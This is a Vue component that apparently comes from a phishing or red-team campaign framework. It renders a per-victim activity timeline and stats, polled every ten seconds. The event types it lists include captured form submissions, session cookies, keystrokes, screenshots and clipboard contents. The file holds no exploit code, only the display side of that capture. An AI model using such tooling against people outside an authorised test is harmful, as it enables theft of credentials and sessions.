<script setup>
import { ref } from 'vue'
import { backendService } from '@/services/backend'
import { formatDateLocal } from '@/utils/utils'
import { useVisibilityPolling } from '@/composables/useVisibilityPolling'

const props = defineProps({
    victim: Object,
    active: {
        type: Boolean,
        default: false
    }
})

// Data
const events = ref([])
const stats = ref({
    total_events: 0,
    active_time: '0m',
    pages_visited: 0,
    auto_refresh: '10s'
})
const loading = ref(false)
const error = ref(null)

async function fetchEvents(signal) {
    try {
        loading.value = true
        error.value = null

        const [response, summary] = await Promise.all([
            backendService.getAllVictimEvents(
                props.victim.campaign_id,
                props.victim.id,
                { signal }
            ),
            backendService.getVictimSummary(
                props.victim.campaign_id,
                props.victim.id,
                { signal }
            )
        ])

        if (!response || !response.events) {
            throw new Error('Invalid response from server')
        }
        if (!summary || !summary.stats) {
            throw new Error('Invalid summary response from server')
        }

        stats.value.active_time = summary.stats.active_time || '0m'
        stats.value.total_events = summary.stats.total_events || 0
        stats.value.pages_visited = summary.stats.navigation_events || 0

        events.value = response.events.map(event => ({
            id: event.id,
            timestamp: event.timestamp,
            type: event.event_type,
            icon: getEventIcon(event.event_type),
            color: getEventColor(event.event_type),
            description: event.title || event.event_type,
            details: event.description || getEventDetails(event)
        }))
    } catch (err) {
        if (err?.name === 'AbortError') return
        console.error('Failed to fetch events:', err)
        error.value = err.message
    } finally {
        loading.value = false
    }
}

// Get icon for event type
function getEventIcon(eventType) {
    const icons = {
        'form_submission': 'pi pi-key',
        'navigation': 'pi pi-external-link',
        'cookie_captured': 'pi pi-box',
        'screenshot': 'pi pi-camera',
        'keylog': 'pi pi-pencil',
        'email_opened': 'pi pi-envelope',
        'email_link_clicked': 'pi pi-link',
        'victim_connected': 'pi pi-check-circle',
        'victim_disconnected': 'pi pi-times-circle',
        'clipboard': 'pi pi-clone'
    }
    return icons[eventType] || 'pi pi-circle'
}

// Get color for event type
function getEventColor(eventType) {
    const colors = {
        'form_submission': 'var(--danger)',
        'navigation': 'var(--info)',
        'cookie_captured': 'var(--warning)',
        'screenshot': 'var(--success)',
        'keylog': 'var(--primary)',
        'email_opened': 'var(--event-cyan)',
        'email_link_clicked': 'var(--info)',
        'victim_connected': 'var(--success)',
        'victim_disconnected': 'var(--text-muted)',
        'clipboard': 'var(--event-pink)'
    }
    return colors[eventType] || 'var(--text-muted)'
}

// Get event details
function getEventDetails(event) {
    if (event.url) return event.url
    if (event.hostname) return event.hostname

    // Try to extract useful info from payload
    const payload = event.payload || {}

    if (payload.fields) {
        const fieldTypes = Object.values(payload.fields).map(f => f.type)
        return fieldTypes.join(', ')
    }

    return ''
}

useVisibilityPolling(fetchEvents, {
    intervalMs: 10000,
    enabled: () => props.active
})
</script>

<template>
    <div class="timeline-panel">
        <div class="panel-header">
            <h4>📊 Activity Timeline</h4>
            <!-- <SelectButton
                v-model="timeRange"
                :options="timeRangeOptions"
                optionLabel="label"
                optionValue="value"
            /> -->
        </div>

        <!-- Loading state -->
        <div v-if="loading && events.length === 0" class="timeline-loading" aria-label="Loading events">
            <Skeleton v-for="index in 4" :key="index" height="72px" borderRadius="6px" />
        </div>

        <!-- Error state -->
        <div v-else-if="error" class="error-state">
            <i class="pi pi-exclamation-triangle timeline-error-icon"></i>
            <p>Failed to load events: {{ error }}</p>
        </div>

        <!-- Empty state -->
        <div v-else-if="events.length === 0" class="empty-state">
            <i class="pi pi-inbox" style="font-size: 2rem; color: var(--color-text-mute)"></i>
            <p>No events yet</p>
        </div>

        <!-- Events Timeline -->
        <div v-else class="events-section">
            <div class="events-header">
                <h5>Recent Events</h5>
                <span class="events-count">{{ events.length }} events</span>
            </div>

            <div class="events-timeline">
                <div
                    v-for="event in events"
                    :key="event.id"
                    class="event-item"
                >
                    <div class="event-icon" :style="{ backgroundColor: event.color + '20', color: event.color }">
                        <i :class="event.icon"></i>
                    </div>

                    <div class="event-content">
                        <div class="event-header">
                            <span class="event-description">{{ event.description }}</span>
                            <span class="event-time">{{ formatDateLocal(event.timestamp) }}</span>
                        </div>
                        <div class="event-details">{{ event.details }}</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Stats Summary -->
        <div class="stats-summary">
            <div class="stat-box">
                <i class="pi pi-eye"></i>
                <div class="stat-content">
                    <span class="stat-value">{{ stats.total_events.toLocaleString() }}</span>
                    <span class="stat-label">Total Events</span>
                </div>
            </div>

            <div class="stat-box">
                <i class="pi pi-clock"></i>
                <div class="stat-content">
                    <span class="stat-value">{{ stats.active_time }}</span>
                    <span class="stat-label">Active Time</span>
                </div>
            </div>

            <div class="stat-box">
                <i class="pi pi-globe"></i>
                <div class="stat-content">
                    <span class="stat-value">{{ stats.pages_visited }}</span>
                    <span class="stat-label">Pages Visited</span>
                </div>
            </div>

            <div class="stat-box" :class="{ 'refreshing': loading }">
                <i class="pi pi-refresh"></i>
                <div class="stat-content">
                    <span class="stat-value">{{ stats.auto_refresh }}</span>
                    <span class="stat-label">Auto-refresh</span>
                </div>
            </div>
        </div>
    </div>
</template>

<style scoped>
.timeline-panel {
    display: flex;
    flex-direction: column;
    gap: 1.5rem;
}

.panel-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.panel-header h4 {
    font-size: 1rem;
    font-weight: 600;
    color: var(--color-heading);
    margin: 0;
}

/* Loading/Error/Empty states */
.timeline-loading {
    display: flex;
    flex-direction: column;
    gap: 0.75rem;
}

.error-state,
.empty-state {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 1rem;
    padding: 3rem;
    background-color: var(--color-background-mute);
    border: 1px dashed var(--color-border);
    border-radius: 6px;
}

.error-state p,
.empty-state p {
    margin: 0;
    color: var(--color-text-mute);
    font-size: 0.9rem;
}

/* Events section */
.events-section {
    display: flex;
    flex-direction: column;
    gap: 1rem;
}

.events-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.events-header h5 {
    font-size: 0.9rem;
    font-weight: 600;
    color: var(--color-heading);
    margin: 0;
}

.events-count {
    font-size: 0.75rem;
    color: var(--color-text-mute);
    background-color: var(--color-background-mute);
    padding: 0.25rem 0.75rem;
    border-radius: 12px;
    border: 1px solid var(--color-border);
}

.events-timeline {
    display: flex;
    flex-direction: column;
    gap: 0.75rem;
    max-height: 600px;
    overflow-y: auto;
    padding-right: 0.5rem;
}

/* Custom scrollbar */
.events-timeline::-webkit-scrollbar {
    width: 6px;
}

.events-timeline::-webkit-scrollbar-track {
    background: var(--color-background-mute);
    border-radius: 3px;
}

.events-timeline::-webkit-scrollbar-thumb {
    background: var(--color-border);
    border-radius: 3px;
}

.events-timeline::-webkit-scrollbar-thumb:hover {
    background: var(--color-border-hover);
}

.event-item .event-details {
    word-wrap: break-word;      /* Break long words */
    word-break: break-word;     /* Force break if needed */
    overflow-wrap: break-word;  /* Modern standard */
    white-space: pre-wrap;      /* Preserve line breaks */
    max-width: 100%;            /* Prevent overflow */
}


.event-item {
    display: flex;
    gap: 1rem;
    padding: 1rem;
    background-color: var(--color-background-mute);
    border: 1px solid var(--color-border);
    border-radius: 6px;
    transition: var(--transition-interactive);
}

.event-item:hover {
    border-color: var(--color-border-hover);
    box-shadow: var(--shadow-xs);
    transform: translateY(-1px);
}

.event-icon {
    width: 40px;
    height: 40px;
    border-radius: 8px;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
    font-size: 1.125rem;
}

.event-content {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 0.25rem;
    min-width: 0;
}

.event-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 1rem;
}

.event-description {
    font-weight: 600;
    font-size: 0.9rem;
    color: var(--color-heading);
}

.event-time {
    font-size: 0.75rem;
    color: var(--color-text-mute);
    white-space: nowrap;
}

.event-details {
    font-size: 0.8rem;
    color: var(--color-text-mute);
    font-family: 'JetBrains Mono', monospace;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}

/* Stats summary */
.stats-summary {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 1rem;
}

.stat-box {
    display: flex;
    align-items: center;
    gap: 1rem;
    padding: 1rem;
    background-color: var(--color-background-mute);
    border: 1px solid var(--color-border);
    border-radius: 6px;
    transition: var(--transition-interactive);
}

.stat-box:hover {
    border-color: var(--color-border-hover);
}

.stat-box.refreshing i {
    animation: spin 1s linear infinite;
}

@keyframes spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
}

.stat-box i {
    font-size: 1.75rem;
    color: var(--color-accent);
}

.stat-content {
    display: flex;
    flex-direction: column;
    gap: 0.125rem;
}

.stat-value {
    font-size: 1.5rem;
    font-weight: 700;
    color: var(--color-heading);
    line-height: 1;
}

.stat-label {
    font-size: 0.75rem;
    color: var(--color-text-mute);
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.timeline-error-icon {
    color: var(--danger);
    font-size: 2rem;
}

/* Responsive */
@media (max-width: 768px) {
    .events-timeline {
        max-height: 400px;
    }

    .stats-summary {
        grid-template-columns: repeat(2, 1fr);
    }

    .event-header {
        flex-direction: column;
        align-items: flex-start;
        gap: 0.5rem;
    }
}
</style>
